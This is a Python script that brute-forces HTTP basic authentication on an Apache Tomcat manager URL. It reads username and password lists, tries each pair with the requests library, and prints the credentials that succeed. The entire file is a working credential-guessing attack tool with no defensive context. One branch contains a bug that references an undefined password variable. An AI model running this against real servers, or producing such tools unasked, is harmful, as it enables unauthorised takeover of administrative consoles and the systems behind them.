import os.path
import requests
import argparse

def valid_file(parser, arg):
    if not os.path.exists(arg):
        parser.error(f'File {arg} does not exist!')
    else:
        return (arg)

def brute(url,username,password,args):
    r = requests.get(url, auth=(username,password))
    if r.status_code == 200:
        print(f'[+] Bruted : {username}:{password}')
        exit()
    if args.v:
        print(f'[x] Failed : {username}:{password}')


def main():
    parser = argparse.ArgumentParser(prog='Apache Tomcat basic auth bruteforce.', description='Simple basic auth brute programm for Apache Tomcat.')
    parser.add_argument('url', help='Enter Apache Tomcat manager URL', type=str)
    usergroup = parser.add_mutually_exclusive_group(required=True)
    passwordgroup = parser.add_mutually_exclusive_group(required=True)
    passwordgroup.add_argument('-P', dest='passfile', help='Provide your passlist', metavar="FILE", type=lambda x: valid_file(parser,x))
    passwordgroup.add_argument('-p',dest='password',help='Provide password', type=str)
    usergroup.add_argument('-U', dest='userfile', help='Provide your userlist', metavar="FILE", type=lambda x: valid_file(parser,x))
    usergroup.add_argument('-u', dest='username', help='Provide username', type=str)
    parser.add_argument("-v", help="increase output verbosity", action="store_true")
    args = parser.parse_args()

    if args.username and args.passfile:
        passlist = open(args.passfile, 'r')
        for password in passlist:
            brute(args.url,args.username,password.strip(),args)
        passlist.close()
        
    if args.userfile and args.password:
        userlist = open(args.userfile, 'r')
        for user in userlist:
                brute(args.url,user.strip(),password.strip(),args)
        userlist.close()
    if args.userfile is not None and args.passfile is not None:
        userlist = open(args.userfile, 'r')
        passlist = open(args.passfile, 'r')
        for user in userlist:
                passlist.seek(0)
                for password in passlist:
                    brute(args.url,user.strip(),password.strip(),args)
        userlist.close()
        passlist.close()

if __name__ == "__main__":
    main()